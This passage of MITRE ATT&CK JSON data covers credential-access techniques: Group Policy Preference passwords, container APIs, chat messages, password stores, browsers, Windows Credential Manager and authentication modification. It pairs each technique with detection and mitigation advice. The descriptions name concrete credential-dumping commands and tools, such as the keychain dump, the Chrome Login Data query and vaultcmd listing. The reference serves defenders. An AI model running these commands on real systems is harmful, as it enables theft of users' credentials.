href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v%3Dws.11)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft GPP 2016)</a>\n\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public). <a href=\"https://msdn.microsoft.com/library/cc422924.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft GPP Key)</a>\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit’s post exploitation module: <code>post/windows/gather/credentials/gpp</code>\n* Get-GPPPassword <a href=\"https://obscuresecurity.blogspot.co.uk/2012/05/gpp-password-retrieval-with-powershell.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Obscuresecurity Get-GPPPassword)</a>\n* gpprefdecrypt.py\n\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>","detection":"Monitor for attempts to access SYSVOL that involve searching for XML files. \n\nDeploy a new XML file with permissions set to Everyone:Deny and monitor for Access Denied errors. <a href=\"https://adsecurity.org/?p=2288\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity Finding Passwords in SYSVOL)</a>","platforms":["Windows"],"dataSources":["File: File Access","Command: Command Execution"],"mitigations":[{"id":"M1015","name":"Active Directory Configuration","description":"Remove vulnerable Group Policy Preferences. <a href=\"http://support.microsoft.com/kb/2962486\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft MS14-025)</a>"},{"id":"M1047","name":"Audit","description":"Search SYSVOL for any existing GGPs that may contain credentials and remove them. <a href=\"https://adsecurity.org/?p=2288\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity Finding Passwords in SYSVOL)</a>"},{"id":"M1051","name":"Update Software","description":"Apply patch KB2962486 which prevents credentials from being stored in GPPs. <a href=\"https://adsecurity.org/?p=2288\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity Finding Passwords in SYSVOL)</a> <a href=\"https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MS14-025)</a>"}]},{"id":"T1552.007","name":"Container API","description":"Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components. <a href=\"https://docs.docker.com/engine/api/v1.41/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Docker API)</a> <a href=\"https://kubernetes.io/docs/concepts/overview/kubernetes-api/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes API)</a>\n\nAn adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment. <a href=\"https://unit42.paloaltonetworks.com/attackers-tactics-and-techniques-in-unsecured-docker-daemons-revealed/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Unsecured Docker Daemons)</a> An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components.","detection":"Establish centralized logging for the activity of container and Kubernetes cluster components. Monitor logs for actions that could be taken to gather credentials to container and cloud infrastructure, including the use of discovery API calls by new or unexpected users and APIs that access Docker logs.\n\nIt may be possible to detect adversary use of credentials they have obtained such as in Valid Accounts.","platforms":["Containers"],"dataSources":["User Account: User Account Authentication","Command: Command Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Enforce authentication and role-based access control on the container API to restrict users to the least privileges required. <a href=\"https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Hardening Guide)</a> When using Kubernetes, avoid giving users wildcard permissions or adding users to the <code>system:masters</code> group, and use <code>RoleBindings</code> rather than <code>ClusterRoleBindings</code> to limit user privileges to specific namespaces. <a href=\"https://kubernetes.io/docs/concepts/security/rbac-good-practices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes RBAC)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Use the principle of least privilege for privileged accounts such as the service account in Kubernetes. For example, if a pod is not required to access the Kubernetes API, consider disabling the service account altogether. <a href=\"https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Service Accounts)</a>"},{"id":"M1030","name":"Network Segmentation","description":"Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Limit communications with the container service to managed and secured channels, such as local Unix sockets or remote access via SSH. Require secure port access to communicate with the APIs over TLS by disabling unauthenticated access to the Docker API and Kubernetes API Server. <a href=\"https://docs.docker.com/engine/security/protect-access/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Docker Daemon Socket Protect)</a> <a href=\"https://kubernetes.io/docs/concepts/security/controlling-access/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes API Control Access)</a> In Kubernetes clusters deployed in cloud environments, use native cloud platform features to restrict the IP ranges that are permitted to access to API server. <a href=\"https://kubernetes.io/docs/concepts/security/overview/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Cloud Native Security)</a> Where possible, consider enabling just-in-time (JIT) access to the Kubernetes API to place additional restrictions on access. <a href=\"https://learn.microsoft.com/en-us/azure/aks/managed-aad\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AKS Azure AD 2023)</a>"}]},{"id":"T1552.008","name":"Chat Messages","description":"Adversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.\n\nRather than accessing the stored chat logs (i.e., Credentials In Files), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation <a href=\"https://www.nightfall.ai/blog/saas-slack-security-risks-2020\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Slack Security Risks)</a>.","detection":"","platforms":["SaaS","Office Suite"],"dataSources":["Application Log: Application Log Content"],"mitigations":[{"id":"M1017","name":"User Training","description":"Ensure that developers and system administrators are aware of the risk associated with sharing unsecured passwords across communication services."},{"id":"M1047","name":"Audit","description":"Preemptively search through communication services to find shared unsecured credentials. Searching for common patterns like \"<code>password is </code>\", “<code>password=</code>” and take actions to reduce exposure when found."}]}]},{"id":"T1555","name":"Credentials from Password Stores","description":"Adversaries may search for common password storage locations to obtain user credentials. <a href=\"https://www.f-secure.com/documents/996508/1030745/dukes_whitepaper.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: F-Secure The Dukes)</a> Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.","detection":"Monitor system calls, file read events, and processes for suspicious activity that could indicate searching for a password  or other activity related to performing keyword searches (e.g. password, pwd, login, store, secure, credentials, etc.) in process memory for credentials. File read events should be monitored surrounding known password storage applications.","platforms":["IaaS","Linux","macOS","Windows"],"dataSources":["File: File Access","Command: Command Execution","Process: Process Access","Cloud Service: Cloud Service Enumeration","Process: Process Creation","Process: OS API Execution"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Limit the number of accounts and services with permission to query information from password stores to only those required. Ensure that accounts and services with permissions to query password stores only have access to the secrets they require."},{"id":"M1027","name":"Password Policies","description":"The password for the user's login keychain can be changed from the user's login password. This increases the complexity for an adversary because they need to know an additional password.\n\nOrganizations may consider weighing the risk of storing credentials in password stores and web browsers. If system, software, or web browser credential disclosure is a significant concern, technical controls, policy, and user training may be used to prevent storage of credentials in improper locations."},{"id":"M1051","name":"Update Software","description":"Perform regular software updates to mitigate exploitation risk."}],"subTechniques":[{"id":"T1555.001","name":"Keychain","description":"Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple’s iCloud service. \n\nKeychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>. <a href=\"https://developer.apple.com/documentation/security/keychain_services\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Keychain Services Apple)</a> <a href=\"https://support.passware.com/hc/en-us/articles/4573379868567-A-Deep-Dive-into-Apple-Keychain-Decryption\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Keychain Decryption Passware)</a> <a href=\"https://www.netmeister.org/blog/keychain-passwords.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX Keychain Schaumann)</a>\n\nAdversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain –d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user’s password to login to the macOS host. <a href=\"https://www.slideshare.net/slideshow/external-to-da-the-os-x-way/62021418\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: External to DA, the OS X Way)</a> <a href=\"https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/python/collection/osx/keychaindump_decrypt.py\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Empire Keychain Decrypt)</a>","detection":"Unlocking the keychain and using passwords from it is a very common process, so there is likely to be a lot of noise in any detection technique. Monitoring of system calls to the keychain can help determine if there is a suspicious process trying to access it.","platforms":["macOS"],"dataSources":["Command: Command Execution","Process: Process Creation","Process: OS API Execution","File: File Access"],"mitigations":[{"id":"M1027","name":"Password Policies","description":"The password for the user's login keychain can be changed from the user's login password. This increases the complexity for an adversary because they need to know an additional password."}]},{"id":"T1555.002","name":"Securityd Memory","description":"An adversary with root access may gather credentials by reading <code>securityd</code>’s memory. <code>securityd</code> is a service/daemon responsible for implementing security protocols such as encryption and authorization. <a href=\"https://developer.apple.com/library/archive/documentation/Security/Conceptual/Security_Overview/Architecture/Architecture.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Dev SecurityD)</a> A privileged adversary may be able to scan through <code>securityd</code>'s memory to find the correct sequence of keys to decrypt the user’s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc. <a href=\"http://juusosalonen.com/post/30923743427/breaking-into-the-os-x-keychain\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OS X Keychain)</a> <a href=\"https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX Keydnap malware)</a>\n\nIn OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. <a href=\"http://juusosalonen.com/post/30923743427/breaking-into-the-os-x-keychain\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OS X Keychain)</a> <a href=\"https://www.slideshare.net/slideshow/external-to-da-the-os-x-way/62021418\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: External to DA, the OS X Way)</a> Apple’s <code>securityd</code> utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password. <a href=\"http://juusosalonen.com/post/30923743427/breaking-into-the-os-x-keychain\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OS X Keychain)</a>","detection":"Monitor processes and command-line arguments for activity surrounded users searching for credentials or using automated tools to scan memory for passwords.","platforms":["Linux","macOS"],"dataSources":["Command: Command Execution","Process: Process Access"],"mitigations":[]},{"id":"T1555.003","name":"Credentials from Web Browsers","description":"Adversaries may acquire credentials from web browsers by reading files specific to the target browser. <a href=\"https://blog.talosintelligence.com/2018/02/olympic-destroyer.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos Olympic Destroyer 2018)</a> Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key. <a href=\"https://docs.microsoft.com/en-us/windows/desktop/api/dpapi/nf-dpapi-cryptunprotectdata\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft CryptUnprotectData April 2018)</a>\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. <a href=\"https://www.proofpoint.com/us/threat-insight/post/new-vega-stealer-shines-brightly-targeted-campaign\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Proofpoint Vega Credential Stealer May 2018)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2017/07/hawkeye-malware-distributed-in-phishing-campaign.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye HawkEye Malware July 2017)</a> Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the Windows Credential Manager.\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials. <a href=\"https://github.com/putterpanda/mimikittenz\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Mimikittenz July 2016)</a>\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).","detection":"Identify web browser files that contain credentials such as Google Chrome’s Login Data database file: <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code>. Monitor file read events of web browser files that contain credentials, especially when the reading process is unrelated to the subject web browser. Monitor process execution logs to include PowerShell Transcription focusing on those that perform a combination of behaviors including reading web browser process memory, utilizing regular expressions, and those that contain numerous keywords for common web applications (Gmail, Twitter, Office365, etc.).","platforms":["Linux","macOS","Windows"],"dataSources":["Command: Command Execution","Process: Process Access","File: File Access","Process: OS API Execution"],"mitigations":[{"id":"M1017","name":"User Training","description":"Provide user training on secure practices for managing credentials, including avoiding storing sensitive passwords in browsers and using password managers securely. Users should also be educated on identifying phishing attempts that could steal session cookies or credentials."},{"id":"M1018","name":"User Account Management","description":"Implement strict user account management policies to prevent unnecessary accounts from accessing sensitive systems. Regularly audit user accounts to identify and disable inactive accounts that may be targeted by attackers to extract credentials or gain unauthorized access."},{"id":"M1021","name":"Restrict Web-Based Content","description":"Restrict or block web-based content that could be used to extract session cookies or credentials stored in browsers. Use browser security settings, such as disabling third-party cookies and restricting browser extensions, to limit the attack surface."},{"id":"M1027","name":"Password Policies","description":"Organizations may consider weighing the risk of storing credentials in web browsers. If web browser credential disclosure is a significant concern, technical controls, policy, and user training may be used to prevent storage of credentials in web browsers."},{"id":"M1051","name":"Update Software","description":"Regularly update web browsers, password managers, and all related software to the latest versions. Keeping software up-to-date reduces the risk of vulnerabilities being exploited by attackers to extract stored credentials or session cookies."}]},{"id":"T1555.004","name":"Windows Credential Manager","description":"Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults). <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v=ws.11)#credential-manager-store\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Credential Manager store)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-8.1-and-8/jj554668(v=ws.11)?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Credential Locker)</a>\n\nThe Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of Credentials from Web Browsers, Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.\n\nCredential Lockers store credentials in encrypted <code>.vcrd</code> files, located under <code>%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\</code>. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials. <a href=\"https://www.passcape.com/windows_password_recovery_vault_explorer\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: passcape Windows Vault)</a> <a href=\"https://blog.malwarebytes.com/101/2016/01/the-windows-vaults/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malwarebytes The Windows Vault)</a>\n\nAdversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager. <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credenumeratea\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft CredEnumerate)</a> <a href=\"https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Delpy Mimikatz Crendential Manager)</a>\n\nAdversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the “Back up...” button on the “Stored User Names and Passwords” GUI.\n\nPassword recovery tools may also obtain plain text passwords from the Credential Manager. <a href=\"https://blog.malwarebytes.com/101/2016/01/the-windows-vaults/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malwarebytes The Windows Vault)</a>","detection":"Monitor process and command-line parameters of <code>vaultcmd.exe</code> for suspicious activity, such as listing credentials from the Windows Credentials locker (i.e., <code>vaultcmd /listcreds:“Windows Credentials”</code>). <a href=\"https://blog.malwarebytes.com/101/2016/01/the-windows-vaults/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malwarebytes The Windows Vault)</a>\n\nConsider monitoring API calls such as <code>CredEnumerateA</code> that may list credentials from the Windows Credential Manager. <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credenumeratea\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft CredEnumerate)</a> <a href=\"https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Delpy Mimikatz Crendential Manager)</a>\n\nConsider monitoring file reads to Vault locations, <code>%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\</code>, for suspicious activity. <a href=\"https://blog.malwarebytes.com/101/2016/01/the-windows-vaults/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malwarebytes The Windows Vault)</a>","platforms":["Windows"],"dataSources":["File: File Access","Command: Command Execution","Process: OS API Execution","Process: Process Creation"],"mitigations":[{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Consider enabling the “Network access: Do not allow storage of passwords and credentials for network authentication” setting that will prevent network credentials from being stored by the Credential Manager. <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/jj852185(v=ws.11)?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Network access Credential Manager)</a>"}]},{"id":"T1555.005","name":"Password Managers","description":"Adversaries may acquire user credentials from third-party password managers. <a href=\"https://www.ise.io/casestudies/password-manager-hacking/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ise Password Manager February 2019)</a> Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk. <a href=\"https://www.ise.io/casestudies/password-manager-hacking/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ise Password Manager February 2019)</a>\n\nAdversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory. <a href=\"https://www.fox-it.com/media/kadlze5c/201912_report_operation_wocao.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FoxIT Wocao December 2019)</a> <a href=\"https://github.com/GhostPack/KeeThief\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github KeeThief)</a> Adversaries may extract credentials from memory via Exploitation for Credential Access. <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-3610\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NVD CVE-2019-3610)</a>\n Adversaries may also try brute forcing via Password Guessing to obtain the master password of a password manager. <a href=\"https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cyberreason Anchor December 2019)</a>","detection":"Consider monitoring API calls, file read events, and processes for suspicious activity that could indicate searching in process memory of password managers. \n\nConsider monitoring file reads surrounding known password manager applications.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Access","Process: OS API Execution","File: File Access","Command: Command Execution"],"mitigations":[{"id":"M1017","name":"User Training","description":"Provide user training on secure practices for managing credentials, including avoiding storing sensitive passwords in browsers and using password managers securely. Users should also be educated on identifying phishing attempts that could steal session cookies or credentials."},{"id":"M1018","name":"User Account Management","description":"Implement strict user account management policies to prevent unnecessary accounts from accessing sensitive systems. Regularly audit user accounts to identify and disable inactive accounts that may be targeted by attackers to extract credentials or gain unauthorized access."},{"id":"M1027","name":"Password Policies","description":"Refer to NIST guidelines when creating password policies for master passwords. <a href=\"https://pages.nist.gov/800-63-3/sp800-63b.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NIST 800-63-3)</a>"},{"id":"M1051","name":"Update Software","description":"Regularly update web browsers, password managers, and all related software to the latest versions. Keeping software up-to-date reduces the risk of vulnerabilities being exploited by attackers to extract stored credentials or session cookies."},{"id":"M1054","name":"Software Configuration","description":"Consider re-locking password managers after a short timeout to limit the time plaintext credentials live in memory from decrypted databases."}]},{"id":"T1555.006","name":"Cloud Secrets Management Stores","description":"Adversaries may acquire credentials from cloud-native secret management solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Terraform Vault.  \n\nSecrets managers support the secure centralized management of passwords, API keys, and other credential material. Where secrets managers are in use, cloud services can dynamically acquire credentials via API requests rather than accessing secrets insecurely stored in plain text files or environment variables.  \n\nIf an adversary is able to gain sufficient privileges in a cloud environment – for example, by obtaining the credentials of high-privileged Cloud Accounts or compromising a service that has permission to retrieve secrets – they may be able to request secrets from the secrets manager. This can be accomplished via commands such as <code>get-secret-value</code> in AWS, <code>gcloud secrets describe</code> in GCP, and <code>az key vault secret show</code> in Azure. <a href=\"https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Permiso Scattered Spider 2023)</a> <a href=\"https://sysdig.com/blog/scarleteel-2-0/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sysdig ScarletEel 2.0 2023)</a> <a href=\"https://docs.aws.amazon.com/secretsmanager/latest/userguide/retrieving-secrets.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Secrets Manager)</a> <a href=\"https://cloud.google.com/secret-manager/docs/view-secret-details\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Secrets)</a> <a href=\"https://learn.microsoft.com/en-us/azure/key-vault/secrets/quick-create-cli\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure Key Vault)</a>\n\n<strong>Note:</strong> this technique is distinct from Cloud Instance Metadata API in that the credentials are being directly requested from the cloud secrets manager, rather than through the medium of the instance metadata API.","detection":"","platforms":["IaaS"],"dataSources":["Cloud Service: Cloud Service Enumeration"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Limit the number of cloud accounts and services with permission to query the secrets manager to only those required. Ensure that accounts and services with permissions to query the secrets manager only have access to the secrets they require."}]}]},{"id":"T1556","name":"Modify Authentication Process","description":"Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts.\n\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.","detection":"Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>) and correlate then investigate the DLL files these files reference. \n\nPassword filters will also show up as an autorun and loaded DLL in lsass.exe. <a href=\"https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Clymb3r Function Hook Passwords Sept 2013)</a>\n\nMonitor for calls to <code>OpenProcess</code> that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll). <a href=\"https://www.secureworks.com/research/skeleton-key-malware-analysis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dell Skeleton)</a> \n\nMonitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.\n\nMonitor for suspicious additions to the /Library/Security/SecurityAgentPlugins directory. <a href=\"https://xorrior.com/persistent-credential-theft/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Xorrior Authorization Plugins)</a>\n\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services. <a href=\"https://technet.microsoft.com/en-us/library/dn487457.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Audit Policy)</a> Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nMonitor property changes in Group Policy that manage authentication mechanisms (i.e. Group Policy Modification). The <code>Store passwords using reversible encryption</code> configuration should be set to Disabled. Additionally, monitor and/or block suspicious command/script execution of <code>-AllowReversiblePasswordEncryption $true</code>, <code>Set-ADUser</code> and <code>Set-ADAccountControl</code>. Finally, monitor Fine-Grained Password Policies and regularly audit user accounts and group settings. <a href=\"https://adsecurity.org/?p=2053\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: dump_pwd_dcsync)</a>","platforms":["IaaS","Identity Provider","Linux","macOS","Network Devices","Office Suite","SaaS","Windows"],"dataSources":["Application Log: Application Log Content","Process: Process Access","Logon Session: Logon Session Creation","Active Directory: Active Directory Object Modification","User Account: User Account Authentication","Process: OS API Execution","Windows Registry: Windows Registry Key Creation","File: File Creation","User Account: User Account Modification","File: File Modification","Module: Module Load","Cloud Service: Cloud Service Modification","Windows Registry: Windows Registry Key Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure that proper policies are implemented to dictate the the secure enrollment and deactivation of authentication mechanisms, such as MFA, for user accounts."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict write access to the <code>/Library/Security/SecurityAgentPlugins</code> directory."},{"id":"M1024","name":"Restrict Registry Permissions","description":"Restrict Registry permissions to disallow the modification of sensitive Registry keys such as <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order</code>."},{"id":"M1025","name":"Privileged Process Integrity","description":"Enabled features, such as Protected Process Light (PPL), for LSA. <a href=\"https://technet.microsoft.com/en-us/library/dn408187.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft LSA)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Audit domain 